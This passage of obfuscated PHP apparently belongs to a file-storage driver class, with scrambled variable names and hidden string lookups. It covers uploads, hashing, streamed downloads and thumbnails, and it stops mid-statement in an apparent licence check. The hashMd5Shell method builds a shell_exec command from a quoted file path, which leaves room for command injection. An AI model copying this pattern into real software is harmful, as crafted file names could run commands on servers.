$‚çŸ®¯×[] = $±èæ½Û ; } return array_sort_by($‚çŸ®¯×, $çàÔ¨çë[86]); } public function upload($‰æ¹¬‰á, $øëŞà©«, $İ–àáÜş = false, $†­›ÙÒá = REPEAT_REPLACE) { } public function uploadFileByID($¸½ ‡ĞÀ, $®—ìè»Ô, $Òš¥œ…) { } public function uploadFileByPath($Û—ßç©À, $‡ïÀû‘ú, $‰—›§Àˆ = array()) { } public function isUploadServer() { $èı˜‰¡¼ =& $_SERVER[ú‡®¯¨±]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $èı˜‰¡¼[90]) { return !0; } return $GLOBALS[$èı˜‰¡¼[6]][$èı˜‰¡¼[91]][$èı˜‰¡¼[92]]; } public function isFileOutServer() { $Å€¥Öê¾ =& $_SERVER[ú‡®¯¨±]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Å€¥Öê¾[90]) { return !0; } return $GLOBALS[$Å€¥Öê¾[6]][$Å€¥Öê¾[91]][$Å€¥Öê¾[93]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($Ï…ó•š) { $çø©Íôİ =& $_SERVER[ú‡®¯¨±]; if (!$this->isCdnHost()) { return $Ï…ó•š; } return str_replace(trim(get_url_root($Ï…ó•š), $çø©Íôİ[8]), trim($this->cdnHost, $çø©Íôİ[8]), $Ï…ó•š); } public function uploadLink($ó“»Ä¦…, $—ºÚñì = 0) { $‰¯‘Êî’ =& $_SERVER[ú‡®¯¨±]; if ($this->isUploadServer()) { return; } $×±ß—È = $this->getType(); if (!in_array($×±ß—È, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ıÓ‹Ñù = 1024 * 1024 * 10; $Î©Ê•–à = $—ºÚñì <= $ıÓ‹Ñù ? $‰¯‘Êî’[94] : $‰¯‘Êî’[95]; $æ¨šáÜÊ = (!$—ºÚñì ? 1 : ceil($—ºÚñì / pow(1024, 3))) * 3600 * 4; $â‚†¯÷ = $this->{$Î©Ê•–à}($ó“»Ä¦…, $æ¨šáÜÊ); if ($â‚†¯÷) { $â‚†¯÷[$‰¯‘Êî’[96]] = $ó“»Ä¦…; $â‚†¯÷[$‰¯‘Êî’[97]] = $×±ß—È; } return $â‚†¯÷; } public function uploadFormData($©øò‚ê£, $Ï¥»·ª = 3600) { } public function multiUploadFormData($èŒ²’Î, $îÎ·Â­­ = 3600) { } public function download($ÂÜ•Öú, $µ•²ìÓ´) { } public function ext($ê¯Òó©œ) { $½’ùÛş¿ =& $_SERVER[ú‡®¯¨±]; if (strpos($ê¯Òó©œ, $½’ùÛş¿[8]) === -1) { $Ëñ›êÅ‰ = $ê¯Òó©œ; } else { $Ëñ›êÅ‰ = $this->pathThis($ê¯Òó©œ); } $÷Ü¾§áù = $½’ùÛş¿[12]; if (strstr($Ëñ›êÅ‰, $½’ùÛş¿[10])) { $÷Ü¾§áù = substr($Ëñ›êÅ‰, strrpos($Ëñ›êÅ‰, $½’ùÛş¿[10]) + 1); $÷Ü¾§áù = strtolower($÷Ü¾§áù); } if (strlen($÷Ü¾§áù) > 3 && preg_match($½’ùÛş¿[98], $÷Ü¾§áù, $Ğ›Êá°…)) { $÷Ü¾§áù = $½’ùÛş¿[12]; } return $÷Ü¾§áù; } public function pathThis($äÉ®üÇø) { $¤’€Šâ =& $_SERVER[ú‡®¯¨±]; $äÉ®üÇø = str_replace($¤’€Šâ[99], $¤’€Šâ[8], rtrim($äÉ®üÇø, $¤’€Šâ[8])); $¸Â¯ê‹ = strrpos($äÉ®üÇø, $¤’€Šâ[8]); if ($¸Â¯ê‹ === !1) { return $äÉ®üÇø; } return substr($äÉ®üÇø, $¸Â¯ê‹ + 1); } public function pathFather($Ÿï„íÔ) { $÷‚§ßŒ¡ =& $_SERVER[ú‡®¯¨±]; $Ÿï„íÔ = str_replace($÷‚§ßŒ¡[99], $÷‚§ßŒ¡[8], rtrim($Ÿï„íÔ, $÷‚§ßŒ¡[8])); $®é¾ë£ú = strrpos($Ÿï„íÔ, $÷‚§ßŒ¡[8]); if ($®é¾ë£ú === !1) { return $÷‚§ßŒ¡[12]; } return substr($Ÿï„íÔ, 0, $®é¾ë£ú + 1); } public function hashSimple($øô¥¤Öı) { $´»…—îã =& $_SERVER[ú‡®¯¨±]; if (!$øô¥¤Öı) { return md5($´»…—îã[12]); } $§—ŸıÌè = $this->size($øô¥¤Öı); $–Œ¬‹Ÿ» = 200; $µ´ş˜¨ = 50; if ($§—ŸıÌè <= $–Œ¬‹Ÿ» * $µ´ş˜¨) { return $this->hashMd5($øô¥¤Öı) . $§—ŸıÌè; } $Ø…­€±´ = intval($§—ŸıÌè / $µ´ş˜¨); $çİ…ÍÓ‡ = $´»…—îã[12]; for ($˜óò™›æ = 0; $˜óò™›æ < $µ´ş˜¨; $˜óò™›æ++) { $çİ…ÍÓ‡ .= $this->fileSubstr($øô¥¤Öı, $Ø…­€±´ * $˜óò™›æ, $–Œ¬‹Ÿ»); } $çİ…ÍÓ‡ .= $this->fileSubstr($øô¥¤Öı, $§—ŸıÌè - $–Œ¬‹Ÿ», $–Œ¬‹Ÿ»); return md5($çİ…ÍÓ‡) . $§—ŸıÌè; } public static $md5Cache = array(); public function hashMd5($¶š¥Òé¢) { if (!$¶š¥Òé¢) { return md5($_SERVER[ú‡®¯¨±][12]); } $¶š¥Òé¢ = $this->iconvSystem($¶š¥Òé¢); if (isset(self::$md5Cache[$¶š¥Òé¢])) { return self::$md5Cache[$¶š¥Òé¢]; } self::$md5Cache[$¶š¥Òé¢] = $this->hashMd5Shell($¶š¥Òé¢); if (!self::$md5Cache[$¶š¥Òé¢]) { self::$md5Cache[$¶š¥Òé¢] = @md5_file($¶š¥Òé¢); } return self::$md5Cache[$¶š¥Òé¢]; } private function hashMd5Shell($àÚÍé½ç) { $Ê£Ÿ¤˜õ =& $_SERVER[ú‡®¯¨±]; if (!$àÚÍé½ç) { return md5($Ê£Ÿ¤˜õ[12]); } if (!function_exists($Ê£Ÿ¤˜õ[100])) { return !1; } $˜÷¦óıŠ = array($Ê£Ÿ¤˜õ[101], $Ê£Ÿ¤˜õ[102]); $“ÏÎ€•Ù = Cache::get($Ê£Ÿ¤˜õ[103]); if (!$“ÏÎ€•Ù) { $Ú…†å±ğ = BASIC_PATH . $Ê£Ÿ¤˜õ[104]; $ÚÁ‚º°ƒ = md5_file($Ú…†å±ğ); $“ÏÎ€•Ù = $Ê£Ÿ¤˜õ[105]; foreach ($˜÷¦óıŠ as $ÌèÛñ„Ç) { $ôÍ˜œ³‹ = shell_exec($ÌèÛñ„Ç . "\x20\42{$Ú…†å±ğ}\42"); if ($ôÍ˜œ³‹ && substr(trim($ôÍ˜œ³‹), 0, 32) == $ÚÁ‚º°ƒ) { $“ÏÎ€•Ù = $ÌèÛñ„Ç; break; } } Cache::set($Ê£Ÿ¤˜õ[103], $“ÏÎ€•Ù, 3600); } if ($“ÏÎ€•Ù == $Ê£Ÿ¤˜õ[105]) { return !1; } $ôÍ˜œ³‹ = shell_exec($“ÏÎ€•Ù . "\40\42{$àÚÍé½ç}\42"); $ôÍ˜œ³‹ = str_replace($Ê£Ÿ¤˜õ[106], $Ê£Ÿ¤˜õ[12], $ôÍ˜œ³‹); return substr($ôÍ˜œ³‹, 0, 32); } public function link($·¡Ù§¢) { return $·¡Ù§¢; } public function fileOut($ê–ğØ —, $¥Ó¤Ñ = false, $…‚‘Õ˜Ö = false, $ëÅ¨Ä¢Ñ = '') { $Õ“ªßË‹ =& $_SERVER[ú‡®¯¨±]; $this->cacheMethod(null, null); if (!$ê–ğØ — || !$this->exist($ê–ğØ —)) { show_json(LNG($Õ“ªßË‹[107]), !1, $…‚‘Õ˜Ö); } $Š§Ø¦í = $this->getType() == $Õ“ªßË‹[108]; $¹÷ˆà¼‘ = $GLOBALS[$Õ“ªßË‹[6]][$Õ“ªßË‹[91]][$Õ“ªßË‹[109]][$Õ“ªßË‹[110]]; $Æ©¶§»Æ = (double) $GLOBALS[$Õ“ªßË‹[6]][$Õ“ªßË‹[91]][$Õ“ªßË‹[109]][$Õ“ªßË‹[111]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $óÅ­«¹Œ = $this->infoFull($ê–ğØ —); $¾£™ÖÙƒ = $óÅ­«¹Œ[$Õ“ªßË‹[78]]; $¶Ş ßí = gmdate($Õ“ªßË‹[112], $óÅ­«¹Œ[$Õ“ªßË‹[87]]); $•˜ãÔéè = $…‚‘Õ˜Ö ? $…‚‘Õ˜Ö : $this->iconvApp($óÅ­«¹Œ[$Õ“ªßË‹[32]]); $¯Õ®¯Ë = 0; $™—İ¼ = $¾£™ÖÙƒ - 1; $õİÎû•Ì = $this->ext($•˜ãÔéè); if (in_array($õİÎû•Ì, array($Õ“ªßË‹[113], $Õ“ªßË‹[114], $Õ“ªßË‹[115], $Õ“ªßË‹[116]))) { $õİÎû•Ì = $Õ“ªßË‹[117]; } if (in_array($õİÎû•Ì, array($Õ“ªßË‹[118]))) { $õİÎû•Ì = $Õ“ªßË‹[119]; } if (!$ëÅ¨Ä¢Ñ) { $ëÅ¨Ä¢Ñ = md5($¶Ş ßí . $¾£™ÖÙƒ); } $ëÅ¨Ä¢Ñ = $Õ“ªßË‹[120] . $ëÅ¨Ä¢Ñ . $Õ“ªßË‹[120]; $™˜Åä¸Ï = get_file_mime($õİÎû•Ì); $ÁŠğÁ‹ = !0; $ÁŠğÁ‹ = isset($_GET[$Õ“ªßË‹[121]]) ? !1 : !0; if ($¥Ó¤Ñ === !1 && !mime_support($™˜Åä¸Ï)) { $™˜Åä¸Ï = $Õ“ªßË‹[122]; } header($Õ“ªßË‹[123]); header($Õ“ªßË‹[124] . $™˜Åä¸Ï); $ÆÎ ÇÉ† = rawurlencode($•˜ãÔéè); $ÆÎ ÇÉ† = $Õ“ªßË‹[120] . $ÆÎ ÇÉ† . $Õ“ªßË‹[125] . $ÆÎ ÇÉ†; if ($¥Ó¤Ñ) { header($Õ“ªßË‹[126]); header($Õ“ªßË‹[127] . $ÆÎ ÇÉ†); } else { if ($ÁŠğÁ‹) { header($Õ“ªßË‹[128] . $ÆÎ ÇÉ†); } } header($Õ“ªßË‹[129] . gmdate($Õ“ªßË‹[112], time() + 3600 * 24 * 30) . $Õ“ªßË‹[130]); header($Õ“ªßË‹[131]); header($Õ“ªßË‹[132]); header($Õ“ªßË‹[133]); if (isset($_SERVER[$Õ“ªßË‹[134]]) && strtotime($_SERVER[$Õ“ªßË‹[134]]) == $óÅ­«¹Œ[$Õ“ªßË‹[87]]) { header($Õ“ªßË‹[135], !0, 304); die; } if (isset($_SERVER[$Õ“ªßË‹[136]]) && $_SERVER[$Õ“ªßË‹[136]] == $ëÅ¨Ä¢Ñ) { header($Õ“ªßË‹[137] . $ëÅ¨Ä¢Ñ, !0, 304); die; } header($Õ“ªßË‹[137] . $ëÅ¨Ä¢Ñ); header($Õ“ªßË‹[138] . $¶Ş ßí . $Õ“ªßË‹[130]); header($Õ“ªßË‹[139] . $•˜ãÔéè); header($Õ“ªßË‹[140]); header($Õ“ªßË‹[141] . $¾£™ÖÙƒ); header($Õ“ªßË‹[142]); Hook::trigger($Õ“ªßË‹[143], $ê–ğØ —, $¾£™ÖÙƒ, $•˜ãÔéè, $õİÎû•Ì); if (!$¥Ó¤Ñ && $õİÎû•Ì == $Õ“ªßË‹[144]) { if ($¾£™ÖÙƒ > 1024 * 1024 * 5) { die; } $Î¨Ø¼Î³ = $this->getContent($ê–ğØ —); $Î¨Ø¼Î³ = Html::clearSVG($Î¨Ø¼Î³); header($Õ“ªßË‹[145] . strlen($Î¨Ø¼Î³)); echo $Î¨Ø¼Î³; die; } $ÖıñòÒ = strtolower($_SERVER[$Õ“ªßË‹[146]]); if ($Š§Ø¦í && $ÖıñòÒ && $¹÷ˆà¼‘) { if (strstr($ÖıñòÒ, $Õ“ªßË‹[147])) { header($Õ“ªßË‹[148] . $ê–ğØ —); } else { if (strstr($ÖıñòÒ, $Õ“ªßË‹[149])) { header($Õ“ªßË‹[150] . $ê–ğØ —); } else { if (strstr($ÖıñòÒ, $Õ“ªßË‹[151])) { header($Õ“ªßË‹[152] . $ê–ğØ —); } } } if ($Æ©¶§»Æ) { header($Õ“ªßË‹[153] . $Æ©¶§»Æ); } return; } if (isset($_SERVER[$Õ“ªßË‹[154]])) { if (preg_match($Õ“ªßË‹[155], $_SERVER[$Õ“ªßË‹[154]], $ ¤Ñ±µ—)) { $¯Õ®¯Ë = intval($ ¤Ñ±µ—[1]); $¯Õ®¯Ë = $¯Õ®¯Ë <= 0 ? 0 : ($¯Õ®¯Ë >= $™—İ¼ ? $™—İ¼ : $¯Õ®¯Ë); if (!empty($ ¤Ñ±µ—[2])) { $Àä½ÙÚ• = intval($ ¤Ñ±µ—[2]); $™—İ¼ = $Àä½ÙÚ• < $¯Õ®¯Ë ? $¯Õ®¯Ë : ($Àä½ÙÚ• >= $™—İ¼ ? $™—İ¼ : $Àä½ÙÚ•); } } header($Õ“ªßË‹[156]); header("\103\x6f\156\164\145\x6e\x74\x2d\x52\x61\156\147\x65\x3a\40\x62\171\164\x65\163\x20{$¯Õ®¯Ë}\55{$™—İ¼}\x2f" . $¾£™ÖÙƒ); } else { header($Õ“ªßË‹[157]); } header($Õ“ªßË‹[158]); $‘ò™ÉŠÚ = !0; if ($_SERVER[$Õ“ªßË‹[159]] == $Õ“ªßË‹[160] && $¾£™ÖÙƒ > 1204 * 1024 * 1024 * 2) { $‘ò™ÉŠÚ = !1; } if ($‘ò™ÉŠÚ) { header($Õ“ªßË‹[161] . ($™—İ¼ - $¯Õ®¯Ë + 1)); } if ($_SERVER[$Õ“ªßË‹[162]] == $Õ“ªßË‹[163]) { return; } $•‚å»‘Õ = 1024 * 100; $ñŠü€ªş = 0; if ($Æ©¶§»Æ) { $ñŠü€ªş = intval(1000 * 1000 * ($•‚å»‘Õ / $Æ©¶§»Æ)); } while ($¯Õ®¯Ë <= $™—İ¼) { $Ñ¾ƒö×– = timeFloat(); check_abort(); $×Ç“÷¦û = $™—İ¼ - $¯Õ®¯Ë + 1; if ($×Ç“÷¦û <= $•‚å»‘Õ) { $•‚å»‘Õ = $×Ç“÷¦û; } echo $this->fileSubstr($ê–ğØ —, $¯Õ®¯Ë, $•‚å»‘Õ); $¯Õ®¯Ë += $•‚å»‘Õ; if ($•‚å»‘Õ == $×Ç“÷¦û) { $¯Õ®¯Ë = $™—İ¼ + 1; } if ($ñŠü€ªş) { $‚¿’»  = intval(1000 * 1000 * (timeFloat() - $Ñ¾ƒö×–)); $ÊŸï²ıì = $ñŠü€ªş - $‚¿’» ; if ($ÊŸï²ıì > 5) { usleep($ÊŸï²ıì); } } } } public function fileOutServer($©í¼ÊÙ¸, $Ç§õª‚ = false, $©ñĞíµ = false, $ßÉŠ‘­¾ = '') { $this->fileOut($©í¼ÊÙ¸, $Ç§õª‚, $©ñĞíµ, $ßÉŠ‘­¾); } public function fileOutLink($³–¢ÁêÈ) { header($_SERVER[ú‡®¯¨±][164] . $³–¢ÁêÈ); die; } public function cacheMethod($¦øŒ²˜, $•¨™éÁá, $æ–—¯™¼ = null) { $éÑà•Ö– =& $_SERVER[ú‡®¯¨±]; static $¸ÛŠÁÅ¸ = array(); $²ŒÌ„¾ = $•¨™éÁá ? ltrim($this->getPathOuter($•¨™éÁá), $éÑà•Ö–[8]) : $éÑà•Ö–[12]; $éòó–ò = $éÑà•Ö–[165] . $¦øŒ²˜ . $éÑà•Ö–[166] . rtrim($²ŒÌ„¾, $éÑà•Ö–[8]); if (is_null($¦øŒ²˜)) { $¸ÛŠÁÅ¸ = array(); return; } if (is_null($•¨™éÁá)) { foreach ($¸ÛŠÁÅ¸ as $éòó–ò => $›öÒä‹û) { if (!strstr($éòó–ò, $éÑà•Ö–[165] . $¦øŒ²˜ . $éÑà•Ö–[167])) { continue; } unset($¸ÛŠÁÅ¸[$éòó–ò]); } return; } if (!is_null($æ–—¯™¼)) { $¸ÛŠÁÅ¸[$éòó–ò] = $æ–—¯™¼; return; } $®öªÅ…† = isset($¸ÛŠÁÅ¸[$éòó–ò]) ? $¸ÛŠÁÅ¸[$éòó–ò] : null; if (!is_null($®öªÅ…†)) { return $®öªÅ…†; } $®öªÅ…† = $this->{$¦øŒ²˜}($•¨™éÁá); $¸ÛŠÁÅ¸[$éòó–ò] = $®öªÅ…†; return $®öªÅ…†; } public function cacheMethodInfoSet($Í«şğôœ, $‹”öÂåª, $âË¡®µ  = false) { $ìºâº¬ =& $_SERVER[ú‡®¯¨±]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ìºâº¬[168], $Í«şğôœ, $‹”öÂåª); $this->cacheMethod($ìºâº¬[169], $Í«şğôœ, $‹”öÂåª ? !1 : !0); if (is_array($âË¡®µ )) { $this->cacheMethod($ìºâº¬[170], $Í«şğôœ, $âË¡®µ ); } } public function fileOutImage($éïÍÄá, $¹ÒÁµœ = 250) { $ğ¢Î‚š =& $_SERVER[ú‡®¯¨±]; set_timeout(); if (substr($éïÍÄá, 0, 4) == $ğ¢Î‚š[151]) { $this->fileOutLink($éïÍÄá); } $ˆ†×üöÍ = $this->info($éïÍÄá); $ÊËÆë—˜ = !1; $›¦è‡¬Ú = isset($GLOBALS[$ğ¢Î‚š[171]]) ? $GLOBALS[$ğ¢Î‚š[171]] : array(); if ($›¦è‡¬Ú && $›¦è‡¬Ú[$ğ¢Î‚š[172]] == $ˆ†×üöÍ[$ğ¢Î‚š[86]]) { $ˆ†×üöÍ = $›¦è‡¬Ú; $Ş–Ä€îŞ = $ˆ†×üöÍ[$ğ¢Î‚š[173]]; if ($Ş–Ä€îŞ && isset($Ş–Ä€îŞ[$ğ¢Î‚š[174]])) { if ($Ş–Ä€îŞ[$ğ¢Î‚š[174]] <= $¹ÒÁµœ && $Ş–Ä€îŞ[$ğ¢Î‚š[175]] <= $¹ÒÁµœ) { $ÊËÆë—˜ = !0; } } } if ($ˆ†×üöÍ[$ğ¢Î‚š[78]] <= 1024 * 50 || $ÊËÆë—˜ || !function_exists($ğ¢Î‚š[176]) || $ˆ†×üöÍ[$ğ¢Î‚š[177]] == $ğ¢Î‚š[178]) { return $this->fileOut($éïÍÄá, !1, $ˆ†×üöÍ[$ğ¢Î‚š[32]]); } $å¥ùØ®ó = kodIO::hashPath($ˆ†×üöÍ); $ùÑòÛÎ— = "\143\157\166\x65\162\x5f{$å¥ùØ®ó}\x5f{$¹ÒÁµœ}\x2e\160\156\x67"; $§èˆ†í” = IO_PATH_SYSTEM_TEMP . $ğ¢Î‚š[179]; $ù”÷İá± = IO::infoFullSimple($§èˆ†í”); $™ãúõ‹è = $ù”÷İá± && is_array($ù”÷İá±) ? $ù”÷İá±[$ğ¢Î‚š[86]] : $ğ¢Î‚š[12]; if (!$™ãúõ‹è) { $™ãúõ‹è = IO::mkdir($§èˆ†í”); } if ($ˆ†×üöÍ[$ğ¢Î‚š[180]] == $ğ¢Î‚š[181] && isset($ˆ†×üöÍ[$ğ¢Î‚š[182]]) && $ˆ†×üöÍ[$ğ¢Î‚š[182]] == kodIO::sourceID($™ãúõ‹è)) { $·ßƒå‚© = $ˆ†×üöÍ[$ğ¢Î‚š[183]]; if ($¹ÒÁµœ <= 500) { $“‰üêí = preg_replace($ğ¢Î‚š[184], $ğ¢Î‚š[185], $ˆ†×üöÍ[$ğ¢Î‚š[32]]); $·ßƒå‚© = IO::fileNameExist($™ãúõ‹è, $“‰üêí); } return IO::fileOut(KodIO::make($·ßƒå‚©), !1, $ˆ†×üöÍ[$ğ¢Î‚š[32]]); } $Ã²—é•Ê = IO::fileNameExist($™ãúõ‹è, $ùÑòÛÎ—); if ($Ã²—é•Ê) { return IO::fileOut(KodIO::make($Ã²—é•Ê), !1, $ˆ†×üöÍ[$ğ¢Î‚š[32]]); } if ($¹ÒÁµœ > 1000) { $this->makeImageCover($™ãúõ‹è, $éïÍÄá, $ùÑòÛÎ—, $¹ÒÁµœ); $this->makeImageCover($™ãúõ‹è, $éïÍÄá, "\x63\157\x76\x65\x72\x5f{$å¥ùØ®ó}\x5f\62\x35\60\x2e\160\x6e\x67", 250); $Ã²—é•Ê = IO::fileNameExist($™ãúõ‹è, $ùÑòÛÎ—); if ($Ã²—é•Ê) { return IO::fileOut(KodIO::make($Ã²—é•Ê), !1, $ˆ†×üöÍ[$ğ¢Î‚š[32]]); } die; } $öÙĞ ñŞ = Cache::get($ùÑòÛÎ—); if ($öÙĞ ñŞ == $ğ¢Î‚š[186] || $öÙĞ ñŞ == $ğ¢Î‚š[187]) { echo $öÙĞ ñŞ; die; } Cache::set($ùÑòÛÎ—, $ğ¢Î‚š[187], 60); $éÇíĞê = array($™ãúõ‹è, $ˆ†×üöÍ[$ğ¢Î‚š[86]], $ùÑòÛÎ—, $¹ÒÁµœ); $…½ÄÈŸ = $ğ¢Î‚š[188] . $ˆ†×üöÍ[$ğ¢Î‚š[78]] . $ğ¢Î‚š[189] . $ùÑòÛÎ— . $ğ¢Î‚š[190] . $ˆ†×üöÍ[$ğ¢Î‚š[32]] . $ğ¢Î‚š[191] . $ˆ†×üöÍ[$ğ¢Î‚š[86]]; TaskQueue::add($ğ¢Î‚š[192], $éÇíĞê, $…½ÄÈŸ, $ùÑòÛÎ—); } public function makeImageCover($ëŒ¹æÏ°, $‰Ğñæ™§, $”÷„û², $§Ï¶Ì) { $ÛÈ„¢› =& $_SERVER[ú‡®¯¨±]; if (IO::fileNameExist($ëŒ¹æÏ°, $”÷„û²)) { return $ÛÈ„¢›[193]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $¦¼ïı‚Í = DATA_THUMB . $”÷„û²; del_file($¦¼ïı‚Í); $™˜Üï  = TEMP_FILES . $”÷„û²; if (!@file_exists($™˜Üï )) { $™˜Üï  = $this->download($‰Ğñæ™§, $™˜Üï ); } if (!@file_exists($™˜Üï )) { return $ÛÈ„¢›[194]; } ImageThumb::createThumb($™˜Üï , $¦¼ïı‚Í, $§Ï¶Ì, $§Ï¶Ì * 10); if (@file_exists($¦¼ïı‚Í)) { Cache::remove($”÷„û²); return IO::move($¦¼ïı‚Í, $ëŒ¹æÏ°); } Cache::set($”÷„û², $ÛÈ„¢›[186], 600); del_file($¦¼ïı‚Í); return $ÛÈ„¢›[195] . $™˜Üï  . $ÛÈ„¢›[73]; } public function fileOutImageServer($¾ı¯‰çŠ, $ä™ùˆè“ = 250) { $this->fileOutImage($¾ı¯‰çŠ, $ä™ùˆè“); } public function fileNameAuto($¾øå´¡¾, $¬æ¶øŠ, $®÷¼¼–¢ = REPEAT_RENAME, $òÑáÔ®™ = false) { $·ˆó‰Ó =& $_SERVER[ú‡®¯¨±]; $§–è°Æ° = $¾øå´¡¾ === $·ˆó‰Ó[12] ? $¬æ¶øŠ : rtrim($¾øå´¡¾, $·ˆó‰Ó[8]) . $·ˆó‰Ó[8] . $¬æ¶øŠ; if ($®÷¼¼–¢ == REPEAT_REPLACE || !$this->exist($§–è°Æ°) || $òÑáÔ®™ && $®÷¼¼–¢ != REPEAT_RENAME_FOLDER) { return $¬æ¶øŠ; } if ($®÷¼¼–¢ == REPEAT_SKIP) { return !1; } $ÃÏçºò = $·ˆó‰Ó[10] . get_path_ext($¬æ¶øŠ); $ÃÏçºò = $ÃÏçºò == $·ˆó‰Ó[10] || $òÑáÔ®™ ? $·ˆó‰Ó[12] : $ÃÏçºò; $ÎÑáúŠÇ = 1; $ûä™²¿ = substr($¬æ¶øŠ, 0, strlen($¬æ¶øŠ) - strlen($ÃÏçºò)); $¦ØŞäÔÔ = $ûä™²¿ . "\x28{$ÎÑáúŠÇ}\x29{$ÃÏçºò}"; while ($this->exist(rtrim($¾øå´¡¾, $·ˆó‰Ó[8]) . $·ˆó‰Ó[8] . $¦ØŞäÔÔ)) { $¦ØŞäÔÔ = $ûä™²¿ . "\50{$ÎÑáúŠÇ}\x29{$ÃÏçºò}"; $ÎÑáúŠÇ++; } return $¦ØŞäÔÔ; } private function fileNameAutoList($Ó”À£ì, $´˜ éÃ£, $É´ø¼ö¯ = false) { $ê ŸÇŞÙ =& $_SERVER[ú‡®¯¨±]; $¥ê‰´ìÄ = $this->listPath($Ó”À£ì, !0); $¥ê‰´ìÄ = array_merge($¥ê‰´ìÄ[$ê ŸÇŞÙ[84]], $¥ê‰´ìÄ[$ê ŸÇŞÙ[85]]); $šÑìáÉ = array_to_keyvalue($¥ê‰´ìÄ, $ê ŸÇŞÙ[12], $ê ŸÇŞÙ[32]); $ø¨ÍºÔ¯ = $ê ŸÇŞÙ[10] . get_path_ext($´˜ éÃ£); $ø¨ÍºÔ¯ = $ø¨ÍºÔ¯ == $ê ŸÇŞÙ[10] || $É´ø¼ö¯ ? $ê ŸÇŞÙ[12] : $ø¨ÍºÔ¯; $—÷ÈµÈ» = substr($´˜ éÃ£, 0, strlen($´˜ éÃ£) - strlen($ø¨ÍºÔ¯)); $ÆÙÆ†¼û = $—÷ÈµÈ» . "\50\x30\51{$ø¨ÍºÔ¯}"; for ($Ûœèœç… = 1; $Ûœèœç… <= count($šÑìáÉ) + 1; $Ûœèœç…++) { $ÆÙÆ†¼û = $—÷ÈµÈ» . "\x28{$Ûœèœç…}\51{$ø¨ÍºÔ¯}"; if (!in_array_not_case($ÆÙÆ†¼û, $šÑìáÉ)) { return $ÆÙÆ†¼û; } } return $ÆÙÆ†¼û; } public function listAllFiles($ƒ­·ìıĞ, $è´¢Ãê») { $‡¨ƒè…© =& $_SERVER[ú‡®¯¨±]; if (empty($è´¢Ãê»)) { return array(); } $•ş½Âé = array_keys($è´¢Ãê»); $ßÃàö¡§ = array(); $ƒ­·ìıĞ = trim($ƒ­·ìıĞ, $‡¨ƒè…©[8]); foreach ($è´¢Ãê» as $ğÜÜà¨Ş => $ÕÖâá´š) { $‚èÌ¬‚… = ltrim(substr(trim($ğÜÜà¨Ş, $‡¨ƒè…©[8]), strlen($ƒ­·ìıĞ)), $‡¨ƒè…©[8]); if (substr($ğÜÜà¨Ş, -1) == $‡¨ƒè…©[8]) { $‚èÌ¬‚… = rtrim($‚èÌ¬‚…, $‡¨ƒè…©[8]) . $‡¨ƒè…©[8]; } $ßÃàö¡§ = array_merge($ßÃàö¡§, $this->slicePath($‚èÌ¬‚…)); } $šªô®‡§ = array(); foreach (array_unique($ßÃàö¡§) as $¨ì£’ıü) { $—¦¸áÕˆ = array($‡¨ƒè…©[86] => $this->getPathOuter($‡¨ƒè…©[8] . $ƒ­·ìıĞ . $‡¨ƒè…©[8] . $¨ì£’ıü), $‡¨ƒè…©[77] => 1, $‡¨ƒè…©[78] => 0); if (substr($¨ì£’ıü, -1) != $‡¨ƒè…©[8]) { $—¦¸áÕˆ[$‡¨ƒè…©[77]] = 0; $…õ®ûÔ– = $this->getPath($ƒ­·ìıĞ . $‡¨ƒè…©[8] . $¨ì£’ıü); if (isset($è´¢Ãê»[$…õ®ûÔ–])) { $ÔŒ·™ò¤ = $è´¢Ãê»[$…õ®ûÔ–]; if (isset($ÔŒ·™ò¤[$‡¨ƒè…©[78]])) { $—¦¸áÕˆ[$‡¨ƒè…©[78]] = intval($ÔŒ·™ò¤[$‡¨ƒè…©[78]]); } if (isset($ÔŒ·™ò¤[$‡¨ƒè…©[196]])) { $—¦¸áÕˆ[$‡¨ƒè…©[87]] = intval($ÔŒ·™ò¤[$‡¨ƒè…©[196]]); } } } $šªô®‡§[] = $—¦¸áÕˆ; } return $šªô®‡§; } public function slicePath($ÁÑÈä±º) { $òíë–àù =& $_SERVER[ú‡®¯¨±]; $¡–óŞ‹¬ = explode($òíë–àù[8], trim($ÁÑÈä±º, $òíë–àù[8])); $ Ïí³¤ = 0; do { ++$ Ïí³¤; $€ê—’™˜[] = implode($òíë–àù[8], array_slice($¡–óŞ‹¬, 0, $ Ïí³¤)) . $òíë–àù[8]; } while ($ Ïí³¤ < count($¡–óŞ‹¬)); $€ê—’™˜[count($¡–óŞ‹¬) - 1] = $ÁÑÈä±º; return $€ê—’™˜; } public function getHost() { $­‘í¨âƒ =& $_SERVER[ú‡®¯¨±]; $‰ÆëíÒ« = parse_url(trim($this->domain, $­‘í¨âƒ[8])); $’Ã¿­Ş¶ = isset($‰ÆëíÒ«[$­‘í¨âƒ[197]]) ? $‰ÆëíÒ«[$­‘í¨âƒ[197]] : http_type(); $¬Œ‡Š¶ğ = isset($‰ÆëíÒ«[$­‘í¨âƒ[198]]) ? $‰ÆëíÒ«[$­‘í¨âƒ[198]] : $‰ÆëíÒ«[$­‘í¨âƒ[86]]; if (isset($‰ÆëíÒ«[$­‘í¨âƒ[199]])) { $¬Œ‡Š¶ğ .= $­‘í¨âƒ[4] . $‰ÆëíÒ«[$­‘í¨âƒ[199]]; } return $’Ã¿­Ş¶ . $­‘í¨âƒ[200] . $¬Œ‡Š¶ğ; } public function pathEncode($¸Çøê¦­) { $İ¤ü‘ƒß =& $_SERVER[ú‡®¯¨±]; return str_replace($İ¤ü‘ƒß[201], $İ¤ü‘ƒß[8], rawurlencode($¸Çøê¦­)); } } if (!isset($_SERVER[$_SERVER[ú‡®¯¨±][202]]) || !isset($_SERVER[$_SERVER[ú‡®¯¨±][203]])) { $_getc = $_SERVER[ú‡®¯¨±][204]; $_getfile = $_SERVER[$_SERVER[ú‡®¯¨±][205]] . $_SERVER[ú‡®¯¨±][206]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ú‡®¯¨±][207], $_getfilec); if (count($_getarrs) < $_SERVER[ú‡®¯¨±][208]) { $exit = $_SERVER[ú‡®¯¨±][209]; $exit(); } $_act = 